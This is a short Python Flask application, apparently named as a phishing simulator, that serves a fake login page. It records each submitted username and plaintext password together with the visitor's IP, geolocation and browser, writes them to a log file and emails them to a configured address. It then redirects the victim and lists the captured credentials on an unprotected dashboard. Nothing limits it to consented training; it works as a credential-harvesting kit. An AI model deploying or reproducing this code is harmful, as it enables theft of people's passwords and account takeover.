# phishing_simulator/app.py

from flask import Flask, request, render_template, redirect
import logging
from datetime import datetime
import smtplib
import requests

app = Flask(__name__)

logging.basicConfig(filename='creds.log', level=logging.INFO)

ALERT_EMAIL = "your@email.com"
SMTP_SERVER = "smtp.yourmail.com"
SMTP_PORT = 587
SMTP_USER = "your@email.com"
SMTP_PASS = "yourpassword"

def send_email_alert(content):
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_PASS)
            msg = f"Subject: Phishing Attempt Captured\n\n{content}"
            server.sendmail(SMTP_USER, ALERT_EMAIL, msg)
    except Exception as e:
        print(f"Email failed: {e}")

def get_geoip(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        return f"{data['city']}, {data['country']}"
    except:
        return "Unknown"

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    passwd = request.form.get('password')
    ip = request.remote_addr
    agent = request.headers.get('User-Agent')
    timestamp = datetime.now().isoformat()
    location = get_geoip(ip)

    log_entry = f"{timestamp} | IP: {ip} ({location}) | AGENT: {agent} | USERNAME: {user} | PASSWORD: {passwd}"
    logging.info(log_entry)

    send_email_alert(log_entry)
    return redirect("https://example.com")

@app.route('/dashboard')
def dashboard():
    with open('creds.log') as f:
        logs = f.readlines()
    return render_template('dashboard.html', logs=logs)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
